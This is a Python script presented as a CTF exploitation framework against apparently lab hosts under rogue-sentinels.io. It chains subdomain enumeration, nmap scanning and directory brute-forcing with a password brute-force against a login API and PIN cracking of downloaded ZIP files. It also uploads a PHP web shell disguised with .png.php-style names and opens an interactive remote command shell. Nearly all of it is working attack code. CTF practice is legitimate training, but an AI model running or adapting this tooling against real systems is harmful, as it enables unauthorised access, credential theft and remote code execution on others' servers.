#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           ROGUE SENTINELS - CTF EXPLOITATION FRAMEWORK v2                    â•‘
â•‘                   Full Pentest Methodology - Group F                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Complete exploitation script following pentest methodology:
1. DNS Reconnaissance (subdomains)
2. Port scanning (Nmap)
3. Enumeration (Gobuster/Dirbuster)
4. Vulnerability-specific exploitation
"""

import os
import sys
import time
import requests
import subprocess
import socket
import zipfile
import base64
import re
import io
from urllib.parse import quote

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# COULEURS ET UTILITAIRES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"""{Colors.CYAN}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—   â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘   â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•      â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â•‘
â•‘  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â•‘
â•‘  â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•    â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•   â•‘
â•‘                                                                              â•‘
â•‘                    CTF FULL PENTEST FRAMEWORK - Group F                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{Colors.ENDC}""")

def print_success(msg): print(f"{Colors.GREEN}[+] {msg}{Colors.ENDC}")
def print_error(msg): print(f"{Colors.RED}[-] {msg}{Colors.ENDC}")
def print_info(msg): print(f"{Colors.BLUE}[*] {msg}{Colors.ENDC}")
def print_warning(msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.ENDC}")
def print_flag(flag):
    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}")
    print(f"  ğŸš© FLAG CAPTURED: {flag}")
    print(f"{'='*60}{Colors.ENDC}\n")

def print_section(title):
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}{Colors.ENDC}\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def pause():
    input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")

def run_command(cmd, timeout=60):
    """Run a shell command with timeout and return output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FONCTIONS DE CHARGEMENT DES WORDLISTS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def load_wordlist(filename):
    """Load wordlist from wordlists directory/"""
    try:
        # Get absolute path of script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        # Go up one level to reach project root
        project_root = os.path.dirname(script_dir)
        wordlist_path = os.path.join(project_root, 'wordlists', filename)

        with open(wordlist_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
        print_success(f"Wordlist loaded: {filename} ({len(lines)} entries)")
        return lines
    except FileNotFoundError:
        print_error(f"Wordlist not found: {filename}")
        return []
    except Exception as e:
        print_error(f"Error loading {filename}: {e}")
        return []

# Load wordlists from repository files
COMMON_SUBDOMAINS = load_wordlist('common_subdomains.txt')
COMMON_PASSWORDS = load_wordlist('leaked_passwords.txt')
COMMON_URLS = load_wordlist('common_urls.txt')
COMMON_USERS = load_wordlist('leaked_users.txt')

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PHASE 0: RECONNAISSANCE INITIALE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Reconnaissance:
    """Reconnaissance phase: DNS, ports, services"""
    
    def __init__(self, base_domain="rogue-sentinels.io"):
        self.base_domain = base_domain
        self.discovered_subdomains = []
        self.discovered_services = {}
        
    def run_full_recon(self):
        """Execute complete reconnaissance"""
        clear_screen()
        print_section("PHASE 0: RECONNAISSANCE INITIALE")
        
        print_info(f"Target: {self.base_domain}")
        
        # Ã‰tape 1: EnumÃ©ration DNS
        print_info("\n[1/3] Subdomain enumeration...")
        self.enumerate_subdomains()
        
        # Ã‰tape 2: Scan de ports
        print_info("\n[2/3] Port scanning...")
        self.scan_ports()
        
        # Ã‰tape 3: Service identification
        print_info("\n[3/3] Service identification...")
        self.identify_services()
        
        # RÃ©sumÃ©
        self.print_summary()
        
        return self.discovered_services
    
    def enumerate_subdomains(self):
        """Endd active subdomains"""
        print_info(f"Testing {len(COMMON_SUBDOMAINS)} subdomains...")
        
        found = []
        
        for subdomain in COMMON_SUBDOMAINS:
            fqdn = f"{subdomain}.{self.base_domain}"
            
            # Test DNS
            try:
                ip = socket.gethostbyname(fqdn)
                print_success(f"{fqdn} -> {ip}")
                found.append({'subdomain': subdomain, 'fqdn': fqdn, 'ip': ip})
            except socket.gaierror:
                pass
        
        # Test aussi le domaine principal
        try:
            ip = socket.gethostbyname(self.base_domain)
            print_success(f"{self.base_domain} -> {ip}")
            found.append({'subdomain': '', 'fqdn': self.base_domain, 'ip': ip})
        except:
            pass
        
        self.discovered_subdomains = found
        print_info(f"\nTotal: {len(found)} subdomains found")
        
        return found
    
    def scan_ports(self):
        """Scan ports on each subdomain using nmap"""

        for entry in self.discovered_subdomains:
            fqdn = entry['fqdn']
            ip = entry['ip']

            print_info(f"\nScanning {fqdn} ({ip})...")

            open_ports = []

            # Use nmap for full port scan
            print_info("Running nmap scan (all ports)...")
            nmap_result = run_command(f"nmap -p- --min-rate=1000 -T4 {ip} 2>/dev/null | grep ^[0-9]", timeout=120)

            if "open" in nmap_result:
                # Parse nmap results
                for line in nmap_result.split('\n'):
                    if 'open' in line:
                        port = line.split('/')[0]
                        try:
                            open_ports.append(int(port))
                            print_success(f"  Port {port}: open")
                        except:
                            pass

            entry['ports'] = open_ports
    
    def identify_services(self):
        """Identify services on discovered ports"""
        
        for entry in self.discovered_subdomains:
            fqdn = entry['fqdn']
            subdomain = entry['subdomain']
            
            for port in entry.get('ports', []):
                service_key = f"{subdomain}:{port}" if subdomain else f"main:{port}"
                
                # Test HTTP/HTTPS
                for protocol in ['http', 'https']:
                    url = f"{protocol}://{fqdn}:{port}"
                    try:
                        r = requests.get(url, timeout=5, verify=False)
                        
                        # Identify the service
                        service_info = {
                            'url': url,
                            'fqdn': fqdn,
                            'port': port,
                            'protocol': protocol,
                            'status': r.status_code,
                            'title': '',
                            'server': r.headers.get('Server', ''),
                            'technology': []
                        }
                        
                        # Extract the title
                        title_match = re.search(r'<title>([^<]+)</title>', r.text, re.I)
                        if title_match:
                            service_info['title'] = title_match.group(1)
                        
                        # Identify technologies
                        if 'geoserver' in r.text.lower():
                            service_info['technology'].append('GeoServer')
                        if 'upload' in r.text.lower():
                            service_info['technology'].append('FileUpload')
                        if 'login' in r.text.lower() or 'auth' in r.text.lower():
                            service_info['technology'].append('Authentication')
                        if 'calculator' in r.text.lower() or 'adder' in r.text.lower():
                            service_info['technology'].append('Calculator')
                        
                        self.discovered_services[service_key] = service_info
                        print_success(f"  {url} - {service_info['title'] or 'No title'}")
                        break  # If HTTP works, no need to test HTTPS
                        
                    except:
                        pass
    
    def print_summary(self):
        """Display reconnaissance summary"""
        print_section("RECONNAISSANCE SUMMARY")
        
        print(f"{Colors.BOLD}Discovered subdomains:{Colors.ENDC}")
        for entry in self.discovered_subdomains:
            ports_str = ', '.join(map(str, entry.get('ports', [])))
            print(f"  â€¢ {entry['fqdn']} ({entry['ip']}) - Ports: {ports_str or 'none'}")
        
        print(f"\n{Colors.BOLD}Identified services:{Colors.ENDC}")
        for key, service in self.discovered_services.items():
            tech_str = ', '.join(service['technology']) if service['technology'] else 'Unknown'
            print(f"  â€¢ {service['url']}")
            print(f"    Title: {service['title'] or 'N/A'}")
            print(f"    Tech: {tech_str}")
            print()


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNERABILITY #1: FileServer - Bruteforce + ZIP Cracking
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit1_FileServer:
    """
    Exploitation of the FileServer:
    1. Sensitive files enumeration (.htaccess)
    2. Authentication bruteforce
    3. Filesystem exploration
    4. Downloading and bruteforcing ZIP files
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.email = None
        self.password = None
        self.token = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #1: FileServer - Bruteforce + ZIP Cracking")
        
        # Configuration
        print_info("Service configuration:")
        host = input(f"{Colors.CYAN}Host (default: fileserver.rogue-sentinels.io): {Colors.ENDC}") or "fileserver.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 8080): {Colors.ENDC}") or "8080"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Exploitation mode
        print_info("\nOptions:")
        print("  [1] Complete exploitation (enum â†’ bruteforce â†’ extraction)")
        print("  [2] Direct JWT token injection")
        mode = input(f"{Colors.CYAN}Choice (1/2): {Colors.ENDC}") or "1"
        
        if mode == "2":
            self.token = input(f"{Colors.YELLOW}JWT Token: {Colors.ENDC}").strip()
            self.session.headers['Authorization'] = f"Bearer {self.token}"
            # Also in cookie for compatibility
            self.session.cookies.set('token', self.token)
        else:
            # Step 1: Enumeration
            print_info("\n[Step 1] Sensitive files enumeration...")
            self.enumerate_files()
            
            # Step 2: Bruteforce password
            print_info("\n[Step 2] Authentication bruteforce...")
            if not self.bruteforce_auth():
                print_error("Bruteforce failed")
                manual_pass = input(f"{Colors.YELLOW}Manual password: {Colors.ENDC}")
                if manual_pass:
                    self.password = manual_pass
                    self.authenticate()
        
        # Step 3: Filesystem exploration
        print_info("\n[Step 3] Filesystem exploration...")
        zip_files = self.explore_filesystem()
        
        # Step 4: Download and crack ZIPs
        print_info("\n[Step 4] Downloading and cracking ZIP files...")
        flag = self.crack_zips(zip_files)
        
        if flag:
            print_flag(flag)
        else:
            print_error("Flag not found")
        
        pause()
        return flag
    
    def enumerate_files(self):
        """Directory enumeration using DirBuster/Gobuster with common_urls wordlist"""

        print_info("Running DirBuster enumeration...")

        # Get wordlist path
        script_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.dirname(script_dir)
        wordlist_path = os.path.join(project_root, 'wordlists', 'common_urls.txt')

        if not os.path.exists(wordlist_path):
            print_error(f"Wordlist not found: {wordlist_path}")
            self.email = input(f"{Colors.YELLOW}Email (default: security-admin@web2000-corp.com): {Colors.ENDC}") or "security-admin@web2000-corp.com"
            return

        print_info(f"Wordlist: {wordlist_path}")

        # Try gobuster first (faster and more common)
        if run_command("which gobuster", timeout=5).strip():
            print_info("Using gobuster...")
            cmd = f"gobuster dir -u {self.base_url} -w {wordlist_path} -q -n -e 2>/dev/null"
            print_info(f"Command: {cmd}")
            result = run_command(cmd, timeout=120)

        # Fallback to dirb
        elif run_command("which dirb", timeout=5).strip():
            print_info("Using dirb...")
            cmd = f"dirb {self.base_url} {wordlist_path} -S -r 2>/dev/null"
            print_info(f"Command: {cmd}")
            result = run_command(cmd, timeout=120)

        # Fallback to dirbuster (if installed)
        elif run_command("which dirbuster", timeout=5).strip():
            print_info("Using dirbuster...")
            cmd = f"dirbuster -u {self.base_url} -l {wordlist_path} -t 10"
            print_info(f"Command: {cmd}")
            print_warning("DirBuster GUI may open - check results there")
            result = run_command(cmd, timeout=120)

        else:
            print_warning("No directory bruteforce tool found (gobuster/dirb/dirbuster)")
            print_info("Install with: sudo apt install gobuster dirb")
            result = ""

        # Display results
        if result:
            print_info("\n=== DirBuster Results ===")
            print(result)
            print("=" * 60)

            # Parse results to find .htaccess and extract the correct URL
            lines = result.split('\n')
            for line in lines:
                if '.htaccess' in line.lower():
                    print_success(f"Found .htaccess: {line}")

                    # Extract URL from gobuster output (format: http://.../.htaccess)
                    # or from dirb output (format: + http://.../.htaccess)
                    url_match = re.search(r'(https?://[^\s]+\.htaccess)', line)

                    if url_match:
                        htaccess_url = url_match.group(1)
                    else:
                        # Fallback: construct URL
                        htaccess_url = f"{self.base_url}/.htaccess"

                    # Try to fetch it
                    try:
                        r = self.session.get(htaccess_url, timeout=5)
                        if r.status_code == 200:
                            print_info(f"Content:\n{r.text[:500]}")

                            # Search for emails
                            emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', r.text)
                            if emails:
                                self.email = emails[0]
                                print_success(f"Email found: {self.email}")
                                return
                    except:
                        pass

        if not self.email:
            self.email = input(f"{Colors.YELLOW}Email (default: security-admin@web2000-corp.com): {Colors.ENDC}") or "security-admin@web2000-corp.com"
    
    def bruteforce_auth(self):
        """Password bruteforce"""
        
        # Toolkit passwords
        passwords = COMMON_PASSWORDS
        
        print_info(f"Target email: {self.email}")
        print_info(f"Testing {len(passwords)} passwords...")
        
        for pwd in passwords:
            try:
                data = {"email": self.email, "password": pwd}
                r = self.session.post(f"{self.base_url}/api/v1/auth", json=data, timeout=5)
                
                if r.status_code == 200:
                    try:
                        resp = r.json()
                        if 'token' in resp:
                            self.password = pwd
                            self.token = resp['token']
                            self.session.headers['Authorization'] = f"Bearer {self.token}"
                            self.session.cookies.set('token', self.token)
                            print_success(f"Password found: {pwd}")
                            print_success(f"Token: {self.token[:50]}...")
                            return True
                    except:
                        pass
            except:
                pass
        
        return False
    
    def authenticate(self):
        """Authenticate with provided credentials"""
        try:
            data = {"email": self.email, "password": self.password}
            r = self.session.post(f"{self.base_url}/api/v1/auth", json=data, timeout=5)
            
            if r.status_code == 200:
                resp = r.json()
                if 'token' in resp:
                    self.token = resp['token']
                    self.session.headers['Authorization'] = f"Bearer {self.token}"
                    self.session.cookies.set('token', self.token)
                    print_success(f"Authentication successful!")
                    return True
        except Exception as e:
            print_error(f"Error: {e}")
        
        return False
    
    def explore_filesystem(self):
        """Explore filesystem to find backups"""

        zip_files = []

        # Base endpoint to test
        base_endpoint = [
            '/api/v1/folder?folder=',
        ]

        # Use URL wordlist for paths to test
        print_info(f"Using wordlist: {len(COMMON_URLS)} paths to test")
        endpoints = base_endpoint.copy()

        # Add all paths from the wordlist
        for path in COMMON_URLS:
            endpoints.append(f'/api/v1/folder?folder={path}')

        print_info(f"Total: {len(endpoints)} endpoints to test")

        for endpoint in endpoints:
            try:
                r = self.session.get(f"{self.base_url}{endpoint}", timeout=5)

                if r.status_code == 200:
                    print_success(f"Endpoint accessible: {endpoint}")
                    print_info(f"Response: {r.text[:200]}")

                    # Search for ZIP files
                    zip_matches = re.findall(r'[\w\-\_\.]+\.zip', r.text)
                    for z in zip_matches:
                        if z not in zip_files:
                            zip_files.append(z)
                            print_info(f"  ZIP: {z}")

                    # Parser JSON
                    try:
                        data = r.json()
                        if isinstance(data, list):
                            for item in data:
                                if isinstance(item, str) and item.endswith('.zip'):
                                    if item not in zip_files:
                                        zip_files.append(item)
                    except:
                        pass

                    # If ZIPs found, stop search
                    if zip_files:
                        print_success(f"Found {len(zip_files)} ZIP file(s), stopping search")
                        break
            except:
                pass
        
        # If no ZIP found, manual generation
        if not zip_files:
            print_warning("No ZIP found. Generating list...")
            print_info("Curl command to explore:")
            print(f"{Colors.CYAN}curl -b 'token={self.token}' '{self.base_url}/api/v1/folder?folder=backups'{Colors.ENDC}")
            
            pattern = input(f"{Colors.YELLOW}ZIP pattern (default: backup_2001_): {Colors.ENDC}") or "backup_2001_"
            start = int(input(f"{Colors.YELLOW}Start (default: 124): {Colors.ENDC}") or "124")
            end = int(input(f"{Colors.YELLOW}End (default: 350): {Colors.ENDC}") or "350")
            
            for i in range(start, end + 1):
                zip_files.append(f"{pattern}{i}.zip")
        
        print_info(f"\nTotal: {len(zip_files)} fichiers ZIP Ã  traiter")
        return zip_files
    
    def download_zip(self, filename):
        """Download a ZIP file"""
        
        urls = [
            f"{self.base_url}/api/v1/download?file={filename}",
            f"{self.base_url}/api/v1/file?file={filename}",
            f"{self.base_url}/api/v1/files/{filename}",
        ]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.content) > 100:
                    # Check magic bytes
                    if r.content[:2] == b'PK':
                        return r.content
            except:
                pass
        
        return None
    
    def crack_zip(self, zip_content, filename):
        """Crack ZIP file with PINs from 1000 to 9999"""
        
        try:
            zip_buffer = io.BytesIO(zip_content)
            
            # Test PINs from 1000 to 9999
            for pin in range(1000, 10000):
                pin_str = str(pin)
                
                try:
                    with zipfile.ZipFile(zip_buffer, 'r') as zf:
                        zf.setpassword(pin_str.encode())
                        
                        for name in zf.namelist():
                            try:
                                content = zf.read(name)
                                content_str = content.decode('utf-8', errors='ignore')
                                
                                # Flag found?
                                if 'FLAG' in content_str or 'flag' in content_str.lower():
                                    print_success(f"PIN found: {pin_str}")
                                    return pin_str, content_str
                                
                                # If we can read, it's the right PIN
                                print_success(f"PIN found: {pin_str}")
                                return pin_str, content_str
                            except RuntimeError:
                                # Wrong PIN
                                break
                            except:
                                break
                except:
                    pass
                
                zip_buffer.seek(0)
                
                if pin % 1000 == 0:
                    print(f"  Testing PIN: {pin}...", end='\r')
                    
        except Exception as e:
            print_error(f"Error: {e}")
        
        return None, None
    
    def crack_zips(self, zip_files):
        """Download and crack all ZIPs"""
        
        for filename in zip_files:
            print_info(f"Processing: {filename}")
            
            # Download
            content = self.download_zip(filename)
            if not content:
                continue
            
            print_success(f"  Downloaded: {len(content)} bytes")
            
            # Crack
            pin, file_content = self.crack_zip(content, filename)
            
            if pin and file_content:
                # Search for the flag
                flag_match = re.search(r'FLAG[_\-\w]+', file_content, re.I)
                if flag_match:
                    return flag_match.group(0)
                
                # Display content
                print_info(f"Content:\n{file_content[:500]}")
                
                user_flag = input(f"{Colors.YELLOW}Flag found? (copy or Enter): {Colors.ENDC}")
                if user_flag:
                    return user_flag
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNERABILITY #2: Travel - File Upload RCE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit2_Travel:
    """
    Exploitation of Travel via File Upload:
    1. Upload disguised PHP shell (.png.php)
    2. Shell access
    3. Flag search
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.shell_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #2: Travel - File Upload RCE")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (default: travel.rogue-sentinels.io): {Colors.ENDC}") or "travel.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 80): {Colors.ENDC}") or "80"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Step 1: Reconnaissance
        print_info("\n[Step 1] Reconnaissance...")
        self.recon()
        
        # Step 2: PHP shell upload
        print_info("\n[Step 2] PHP shell upload...")
        if not self.upload_shell():
            print_warning("Automatic upload failed")
            print_info("Manual upload:")
            print(f"{Colors.CYAN}curl -X POST {self.base_url}/photos.php -F file=@shell.png.php{Colors.ENDC}")
            input(f"{Colors.YELLOW}Press Enter after manual upload...{Colors.ENDC}")
        
        # Step 3: Shell location
        print_info("\n[Step 3] Shell location...")
        if not self.find_shell():
            self.shell_url = input(f"{Colors.YELLOW}Shell URL: {Colors.ENDC}")
        
        # Step 4: Exploitation
        print_info("\n[Step 4] Flag search...")
        flag = self.find_flag()
        
        if flag:
            print_flag(flag)
        
        # Shell interactif
        self.interactive_shell()
        
        pause()
        return flag
    
    def recon(self):
        """Application reconnaissance"""
        try:
            r = self.session.get(self.base_url, timeout=10)
            print_success(f"Accessible application (Status: {r.status_code})")
            
            # Identify the application
            if 'salmon' in r.text.lower():
                print_info("Application: The Happy Salmon")
            if 'upload' in r.text.lower() or 'photo' in r.text.lower():
                print_success("Upload functionality detected")
            
            # Chercher les endpoints
            forms = re.findall(r'action=["\']([^"\']+)["\']', r.text)
            for form in forms:
                print_info(f"Form: {form}")
                
        except Exception as e:
            print_error(f"Error: {e}")
    
    def upload_shell(self):
        """PHP shell upload"""
        
        # Simple PHP shell
        shell_content = b'<?php system($_REQUEST["cmd"]); ?>'
        
        # Upload endpoint (from toolkit)
        upload_url = f"{self.base_url}/photos.php"
        
        # Different techniques
        attempts = [
            ('shell.png.php', 'image/png'),
            ('shell.php.png', 'image/png'),
            ('shell.phtml', 'image/png'),
            ('shell.php', 'application/x-php'),
        ]
        
        for filename, mimetype in attempts:
            try:
                files = {'file': (filename, shell_content, mimetype)}
                r = self.session.post(upload_url, files=files, timeout=10)
                
                if r.status_code == 200:
                    if 'error' not in r.text.lower() and 'invalid' not in r.text.lower():
                        print_success(f"Shell uploaded: {filename}")
                        self.shell_filename = filename
                        return True
                    else:
                        print_warning(f"{filename}: Rejected")
            except Exception as e:
                print_error(f"Error upload: {e}")
        
        return False
    
    def find_shell(self):
        """Endd uploaded shell"""
        
        # Common directories
        dirs = ['/salmon-uploads/', '/uploads/', '/images/', '/photos/', 
                '/pictures/', '/img/', '/files/']
        
        filename = getattr(self, 'shell_filename', 'shell.png.php')
        
        for d in dirs:
            url = f"{self.base_url}{d}{filename}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    # Test command execution
                    test_url = f"{url}?cmd=id"
                    test_r = self.session.get(test_url, timeout=5)
                    if 'uid=' in test_r.text or 'www-data' in test_r.text:
                        print_success(f"Shell found: {url}")
                        self.shell_url = url
                        return True
            except:
                pass
        
        return False
    
    def exec_cmd(self, cmd):
        """Execute command via shell"""
        try:
            r = self.session.get(f"{self.shell_url}?cmd={quote(cmd)}", timeout=10)
            return r.text
        except:
            return None
    
    def find_flag(self):
        """Rechercher le flag"""
        
        commands = [
            "grep -r 'FLAG' /var/www/ 2>/dev/null | head -10",
            "cat /var/www/html/reservations.php 2>/dev/null | grep -i flag",
            "find /var/www -name '*.php' -exec grep -l FLAG {} \\; 2>/dev/null",
            "cat /var/www/html/*.php 2>/dev/null",
        ]
        
        for cmd in commands:
            print_info(f"Execution: {cmd}")
            result = self.exec_cmd(cmd)
            
            if result:
                # Search for flag
                flag_match = re.search(r'FLAG[_\-\w]+', result, re.I)
                if flag_match:
                    return flag_match.group(0)
                
                if 'flag' in result.lower():
                    print(result[:500])
        
        return None
    
    def interactive_shell(self):
        """Shell interactif"""
        print_info("\n=== Shell Interactif (tapez 'exit' pour quitter) ===")
        
        while True:
            cmd = input(f"{Colors.GREEN}shell> {Colors.ENDC}")
            if cmd.lower() == 'exit':
                break
            if cmd:
                result = self.exec_cmd(cmd)
                if result:
                    print(result)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
